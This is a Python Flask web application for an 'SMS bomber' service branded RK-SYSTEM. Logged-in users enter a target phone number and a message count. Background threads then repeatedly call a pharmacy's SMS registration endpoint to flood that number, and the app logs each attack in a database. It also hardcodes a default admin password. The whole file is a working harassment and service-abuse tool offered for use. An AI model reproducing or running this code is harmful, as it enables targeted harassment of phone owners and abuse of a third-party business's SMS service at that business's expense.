import requests
import threading
import os
import time
import sqlite3
import random
from datetime import datetime, timedelta, timezone
from concurrent.futures import ThreadPoolExecutor
from flask import Flask, render_template_string, request, jsonify, session, redirect, url_for
from werkzeug.security import generate_password_hash, check_password_hash

app = Flask(__name__)
app.secret_key = os.urandom(32)

# ---------- [FEATURE: BST BD TIME ZONE] ----------
def get_bd_time():
    return datetime.now(timezone(timedelta(hours=6)))

# ---------- [DATABASE SETUP] ----------
def get_db():
    conn = sqlite3.connect('rk_v24_ultra.db', check_same_thread=False)
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    with get_db() as conn:
        conn.execute('''CREATE TABLE IF NOT EXISTS history (
            id INTEGER PRIMARY KEY AUTOINCREMENT, username TEXT, phone TEXT, 
            success INTEGER, fail INTEGER, total INTEGER, limit_amt INTEGER, 
            status TEXT, start_time TEXT, stop_time TEXT, duration TEXT, 
            date_str TEXT, timestamp DATETIME)''')
        conn.execute("CREATE TABLE IF NOT EXISTS users (username TEXT UNIQUE, password TEXT, status TEXT)")
        # Default Admin Account as requested
        try:
            conn.execute("INSERT INTO users VALUES (?, ?, ?)", ("admin", generate_password_hash("JaNiNaTo-330"), "active"))
        except: pass

init_db()

# ---------- [CORE ENGINE] ----------
active_sessions = {}

def send_request(phone):
    api_list = ["https://shop.pharmaid-rx.com/api/sendSMSRegistration?mobileNumber={}"]
    try:
        res = requests.get(random.choice(api_list).format(phone), timeout=6)
        return res.status_code == 200
    except: return False

def bombing_task(username, phone, limit, start_dt):
    key = f"{username}_{phone}"
    with ThreadPoolExecutor(max_workers=5) as executor:
        while key in active_sessions:
            curr = active_sessions[key]
            if curr['total'] >= curr['limit'] or curr['status'] == 'Stopped': break
            if curr['status'] == 'Running':
                now = get_bd_time()
                elapsed = now - start_dt
                active_sessions[key]['running_time'] = str(elapsed).split('.')[0]
                if executor.submit(send_request, phone).result():
                    active_sessions[key]['success'] += 1
                else: active_sessions[key]['fail'] += 1
                active_sessions[key]['total'] += 1
                if active_sessions[key]['total'] > 1:
                    avg = elapsed.total_seconds() / active_sessions[key]['total']
                    active_sessions[key]['eta'] = str(timedelta(seconds=int(avg * (limit - active_sessions[key]['total']))))
                time.sleep(0.15)
            else: time.sleep(1)

    stop_dt = get_bd_time()
    s = active_sessions.get(key)
    if s and s['status'] != 'Paused':
        with get_db() as conn:
            conn.execute("INSERT INTO history (username, phone, success, fail, total, limit_amt, status, start_time, stop_time, duration, date_str, timestamp) VALUES (?,?,?,?,?,?,?,?,?,?,?,?)",
                (username, phone, s['success'], s['fail'], s['total'], limit, "Completed", s['start_time'], stop_dt.strftime("%I:%M %p"), s['running_time'], start_dt.strftime("%d/%m/%Y"), start_dt))
        del active_sessions[key]

# ---------- [ULTRA HACKER THEME UI] ----------
LAYOUT = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>RK-SYSTEM ULTRA</title>
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;900&family=Rajdhani:wght@500;700&family=Source+Code+Pro:wght@400;700&display=swap" rel="stylesheet">
    <style>
        :root { --neon: #00ffcc; --bg: #010101; --card: #080808; --red: #ff003c; --blue: #00d2ff; --gold: #f39c12; }
        
        * { box-sizing: border-box; }
        body { 
            background: var(--bg); color: #e0e0e0; font-family: 'Rajdhani', sans-serif; 
            margin: 0; overflow-x: hidden; 
        }

        /* ZOOM IN / DOOR OPEN ANIMATION */
        .page-entry {
            animation: doorOpen 1.8s cubic-bezier(0.16, 1, 0.3, 1) forwards;
            transform-origin: center;
        }
        @keyframes doorOpen {
            0% { transform: scale(0.5); opacity: 0; filter: blur(10px); }
            100% { transform: scale(1); opacity: 1; filter: blur(0px); }
        }

        /* NEON BANNER */
        .neon-banner {
            text-align: center; padding: 25px 0; margin-bottom: 20px;
            background: rgba(0,0,0,0.8); border-bottom: 2px solid var(--neon);
            box-shadow: 0 0 20px rgba(0, 255, 204, 0.2);
        }
        .banner-text {
            font-family: 'Orbitron'; font-size: 3.5rem; font-weight: 900;
            color: #fff; text-transform: uppercase; letter-spacing: 10px;
            text-shadow: 0 0 10px var(--neon), 0 0 20px var(--neon), 0 0 40px var(--blue);
            animation: glow 2s ease-in-out infinite alternate;
        }
        @keyframes glow {
            from { text-shadow: 0 0 10px var(--neon), 0 0 20px var(--neon); }
            to { text-shadow: 0 0 20px var(--blue), 0 0 30px var(--blue), 0 0 50px var(--neon); }
        }

        #canvas { position: fixed; top: 0; left: 0; z-index: -1; opacity: 0.1; }

        .nav { 
            background: rgba(0,0,0,0.95); padding: 15px 25px; border-bottom: 1px solid #222; 
            display: flex; justify-content: space-between; align-items: center; position: sticky; top:0; z-index:1000; 
        }
        .logo { font-family: 'Orbitron'; color: var(--neon); text-shadow: 0 0 5px var(--neon); cursor:pointer; font-weight:bold;}
        
        .three-dot { cursor: pointer; padding: 5px; z-index: 2001; }
        .dot { height: 4px; width: 4px; background: var(--neon); border-radius: 50%; display: block; margin: 3px; box-shadow: 0 0 5px var(--neon); }
        
        .menu-dropdown { 
            position: absolute; right: 20px; top: 60px; background: var(--card); border: 1px solid var(--neon); 
            border-radius: 10px; width: 220px; display: none; z-index: 2000; box-shadow: 0 0 30px rgba(0,255,204,0.3); 
        }
        .menu-dropdown a { display: block; padding: 12px 20px; color: #fff; text-decoration: none; font-family: 'Orbitron'; font-size: 11px; border-bottom: 1px solid #111; transition: 0.3s; }
        .menu-dropdown a:hover { background: var(--neon); color: #000; }

        .container { padding: 20px; max-width: 500px; margin: auto; }
        
        /* PREMIUM RGB FRAME */
        .monitor-frame { position: relative; background: #000; border-radius: 15px; padding: 2px; overflow: hidden; margin-bottom: 25px; box-shadow: 0 0 15px rgba(0,0,0,1); }
        .monitor-frame::before { content: ""; position: absolute; top: -50%; left: -50%; width: 200%; height: 200%; background: conic-gradient(transparent, var(--neon), var(--blue), var(--neon)); animation: rotate 4s linear infinite; }
        @keyframes rotate { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
        .monitor-content { position: relative; background: var(--card); border-radius: 13px; padding: 25px; z-index: 2; }

        input { 
            width: 100%; padding: 15px; margin: 10px 0; background: #000; border: 1px solid #222; 
            color: var(--neon); border-radius: 10px; font-family: 'Source Code Pro'; outline: none; border-left: 3px solid var(--neon);
        }
        .pass-group { position: relative; }
        .toggle-pass { 
            position: absolute; right: 15px; top: 25px; cursor: pointer; color: var(--neon); font-size: 12px; font-weight: bold;
        }

        .btn-turbo { 
            background: linear-gradient(90deg, var(--neon), var(--blue)); color: #000; border: none; 
            padding: 16px; width: 100%; border-radius: 10px; font-family: 'Orbitron'; font-weight: 900; 
            cursor: pointer; text-transform: uppercase; transition: 0.4s; margin-top: 10px;
        }
        .btn-turbo:hover { box-shadow: 0 0 20px var(--neon); transform: translateY(-2px); }

        .footer-credit { 
            text-align: center; padding: 30px; font-family: 'Orbitron'; font-size: 11px; color: #555; letter-spacing: 1px;
        }
        .footer-credit b { color: var(--neon); text-shadow: 0 0 5px var(--neon); }

        .info-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-top: 15px; }
        .info-box { background: rgba(255,255,255,0.02); border: 1px solid #1a1a1a; padding: 12px; border-radius: 8px; text-align: center; }
        .info-box span { display: block; font-size: 9px; color: #666; font-weight: bold; }
        .info-box b { font-family: 'Orbitron'; font-size: 1rem; color: #fff; }

        .progress-bar { height: 6px; background: #111; border-radius: 3px; margin: 15px 0; overflow: hidden; }
        .progress-fill { height: 100%; background: var(--neon); box-shadow: 0 0 10px var(--neon); transition: 0.4s linear; }
        
        .c-neon { color: var(--neon); } .c-blue { color: var(--blue); } .c-red { color: var(--red); }
    </style>
</head>
<body onclick="document.getElementById('mBox').style.display='none'">
    <canvas id="canvas"></canvas>
    
    <div class="page-entry">
        <div class="neon-banner">
            <div class="banner-text">RK-SYSTEM</div>
        </div>

        <nav class="nav">
            <div class="logo" onclick="location.href='/dashboard'">TERMINAL V24</div>
            <div class="three-dot" onclick="event.stopPropagation(); let m=document.getElementById('mBox'); m.style.display=(m.style.display==='block'?'none':'block')">
                <span class="dot"></span><span class="dot"></span><span class="dot"></span>
            </div>
        </nav>

        <div class="menu-dropdown" id="mBox">
            <a href="/history"><b class="c-neon">01.</b> ALL HISTORY</a>
            <a href="/running-logs"><b class="c-gold">02.</b> RUNNING</a>
            <a href="/last-attack"><b class="c-blue">03.</b> LAST ATTACK</a>
            <a href="https://t.me/rk_system" target="_blank"><b class="c-purple">04.</b> ADMIN</a>
            <a href="/profile"><b class="c-blue">05.</b> PROFILES</a>
            <a href="/logout" style="color:var(--red); border-top:1px solid #222;"><b>!!</b> LOGOUT</a>
        </div>

        <div class="container">[CONTENT]</div>

        <div class="footer-credit">
            THIS SYSTEM CREATED BY <b>RK-SYSTEM</b> 2026<br>
            <span style="opacity:0.5">V.24.02.26 | PREMIUM ENCRYPTED</span>
        </div>
    </div>

    <script>
        // Matrix Effect
        const canvas = document.getElementById('canvas');
        const ctx = canvas.getContext('2d');
        canvas.width = window.innerWidth; canvas.height = window.innerHeight;
        const letters = "RK01"; const fontSize = 15;
        const columns = canvas.width / fontSize; const drops = Array(Math.floor(columns)).fill(1);
        function draw() {
            ctx.fillStyle = 'rgba(0, 0, 0, 0.05)'; ctx.fillRect(0, 0, canvas.width, canvas.height);
            ctx.fillStyle = '#00ffcc'; ctx.font = fontSize + 'px Orbitron';
            for(let i=0; i<drops.length; i++) {
                const text = letters.charAt(Math.floor(Math.random()*letters.length));
                ctx.fillText(text, i*fontSize, drops[i]*fontSize);
                if(drops[i]*fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
                drops[i]++;
            }
        } setInterval(draw, 50);

        function togglePass(id) {
            let x = document.getElementById(id);
            let t = document.getElementById(id+'-btn');
            if (x.type === "password") { x.type = "text"; t.innerText = "HIDE"; }
            else { x.type = "password"; t.innerText = "SHOW"; }
        }

        function sync() {
            let area = document.getElementById('live-engine'); if(!area) return;
            fetch('/api/status').then(r=>r.json()).then(data=>{
                let html = '';
                for(let k in data){
                    let s = data[k]; let p = (s.total/s.limit)*100;
                    html += `<div class="monitor-frame"><div class="monitor-content">
                        <div style="display:flex; justify-content:space-between;"><b class="c-blue">${s.phone}</b><span class="c-neon">● ${s.status}</span></div>
                        <div class="progress-bar"><div class="progress-fill" style="width:${p}%"></div></div>
                        <div class="info-grid">
                            <div class="info-box"><span>SUCCESS</span><b class="c-neon">${s.success}</b></div>
                            <div class="info-box"><span>ETA</span><b style="font-size:0.7rem;">${s.eta}</b></div>
                        </div>
                        <div style="display:flex; gap:10px; margin-top:15px;">
                            <button class="btn-ctrl" style="flex:1; background:var(--gold); border:none; padding:8px; border-radius:5px; font-family:Orbitron; font-size:9px;" onclick="location.href='/api/control?num=${s.phone}&action=${s.status==='Running'?'Paused':'Running'}'">${s.status==='Running'?'PAUSE':'RESUME'}</button>
                            <button class="btn-ctrl" style="flex:1; background:var(--red); color:#fff; border:none; padding:8px; border-radius:5px; font-family:Orbitron; font-size:9px;" onclick="location.href='/api/stop?num=${s.phone}'">STOP</button>
                        </div>
                    </div></div>`;
                } area.innerHTML = html;
            });
        } setInterval(sync, 1500);
    </script>
</body></html>
'''

# ---------- [ROUTES] ----------
@app.route('/')
def root(): return redirect(url_for('login'))

@app.route('/login', methods=['GET', 'POST'])
def login():
    error = ""
    if request.method == 'POST':
        u, p = request.form.get('u'), request.form.get('p')
        with get_db() as conn:
            user = conn.execute("SELECT * FROM users WHERE username=?", (u,)).fetchone()
        if user and check_password_hash(user['password'], p):
            session['user'] = u; return redirect(url_for('dashboard'))
        error = "INVALID CREDENTIALS"
    return render_template_string(LAYOUT.replace('[CONTENT]', f'''
        <div class="monitor-frame"><div class="monitor-content" style="text-align:center;">
            <h3 class="c-neon">SECURITY LOGIN</h3>
            <p class="c-red" style="font-size:10px;">{error}</p>
            <form method="POST">
                <input name="u" placeholder="USERNAME" required>
                <div class="pass-group">
                    <input name="p" type="password" id="pass-field" placeholder="PASSWORD" required>
                    <span class="toggle-pass" id="pass-field-btn" onclick="togglePass('pass-field')">SHOW</span>
                </div>
                <button class="btn-turbo">BYPASS SYSTEM</button>
            </form>
            <p style="font-size:12px; margin-top:15px;">NEW OPERATOR? <a href="/register" class="c-blue" style="text-decoration:none;">CREATE ACCOUNT</a></p>
        </div></div>'''))

@app.route('/register', methods=['GET', 'POST'])
def register():
    msg = ""
    if request.method == 'POST':
        u, p = request.form.get('u'), request.form.get('p')
        with get_db() as conn:
            try:
                conn.execute("INSERT INTO users VALUES (?, ?, ?)", (u, generate_password_hash(p), "active"))
                return redirect(url_for('login'))
            except: msg = "USERNAME ALREADY TAKEN"
    return render_template_string(LAYOUT.replace('[CONTENT]', f'''
        <div class="monitor-frame"><div class="monitor-content" style="text-align:center;">
            <h3 class="c-blue">CREATE OPERATOR</h3>
            <p class="c-red" style="font-size:10px;">{msg}</p>
            <form method="POST">
                <input name="u" placeholder="CHOOSE USERNAME" required>
                <div class="pass-group">
                    <input name="p" type="password" id="reg-pass" placeholder="SET PASSWORD" required>
                    <span class="toggle-pass" id="reg-pass-btn" onclick="togglePass('reg-pass')">SHOW</span>
                </div>
                <button class="btn-turbo">REGISTER ACCOUNT</button>
            </form>
            <p style="font-size:12px; margin-top:15px;"><a href="/login" class="c-neon" style="text-decoration:none;">BACK TO LOGIN</a></p>
        </div></div>'''))

@app.route('/dashboard')
def dashboard():
    if 'user' not in session: return redirect(url_for('login'))
    return render_template_string(LAYOUT.replace('[CONTENT]', '<div class="monitor-frame"><div class="monitor-content"><h3 class="c-neon">LAUNCH TERMINAL</h3><form action="/api/start"><input name="num" placeholder="TARGET NUMBER" required><input name="amt" type="number" placeholder="LIMIT" required><button class="btn-turbo">START ATTACK</button></form></div></div><div id="live-engine"></div>'))

@app.route('/history')
def history():
    if 'user' not in session: return redirect(url_for('login'))
    with get_db() as conn: logs = conn.execute("SELECT phone, COUNT(*) as sessions, SUM(success) as total_ok FROM history GROUP BY phone ORDER BY id DESC").fetchall()
    html = '<h3 class="c-blue">DATABASE LOGS</h3>'
    for l in logs:
        html += f'<div class="monitor-frame" onclick="location.href=\'/history/{l["phone"]}\'"><div class="monitor-content" style="cursor:pointer;"><b class="c-neon">{l["phone"]}</b><br><small>Total Success: {l["total_ok"]}</small></div></div>'
    return render_template_string(LAYOUT.replace('[CONTENT]', html))

@app.route('/api/start')
def api_start():
    u, num, amt = session.get('user'), request.args.get('num'), request.args.get('amt')
    if u and num and amt:
        now = get_bd_time(); key = f"{u}_{num}"
        active_sessions[key] = {'phone': num, 'success': 0, 'fail': 0, 'total': 0, 'limit': int(amt), 'status': 'Running', 'start_time': now.strftime("%I:%M %p"), 'running_time': '0:00:00', 'eta': '---'}
        threading.Thread(target=bombing_task, args=(u, num, int(amt), now), daemon=True).start()
    return redirect(url_for('dashboard'))

@app.route('/api/status')
def api_status(): return jsonify({k: v for k, v in active_sessions.items() if k.startswith(session.get('user', ''))})

@app.route('/api/stop')
def api_stop():
    key = f"{session['user']}_{request.args.get('num')}"
    if key in active_sessions: active_sessions[key]['status'] = 'Stopped'
    return redirect(url_for('dashboard'))

@app.route('/logout')
def logout(): session.clear(); return redirect(url_for('login'))

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=54300)
